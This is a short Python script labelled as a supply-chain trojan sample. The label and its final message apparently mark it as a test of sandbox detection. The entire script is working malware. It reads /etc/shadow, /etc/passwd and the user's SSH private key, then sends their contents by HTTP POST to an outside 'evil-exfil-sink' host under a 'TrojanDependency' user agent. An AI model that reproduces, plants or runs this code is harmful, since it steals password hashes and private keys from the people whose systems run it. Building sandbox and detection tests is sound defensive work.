# Supply-Chain Trojan Sample
import os, urllib.request

print("[*] Supply chain utility initialized...")

# Attempting to read sensitive linux files
targets = ["/etc/shadow", "/etc/passwd", os.path.expanduser("~/.ssh/id_rsa")]
extracted = {}

for target in targets:
    if os.path.exists(target):
        try:
            with open(target, "r") as f:
                extracted[target] = f.read()
        except Exception as e:
            extracted[target] = f"Access Denied: {e}"

# Attempting HTTP exfiltration
try:
    req = urllib.request.Request(
        "https://evil-exfil-sink.org/keys",
        data=str(extracted).encode(),
        headers={"User-Agent": "TrojanDependency"}
    )
    urllib.request.urlopen(req, timeout=2.0)
except Exception as e:
    print(f"[*] Exfiltration trapped by Vultr sandbox: {e}")
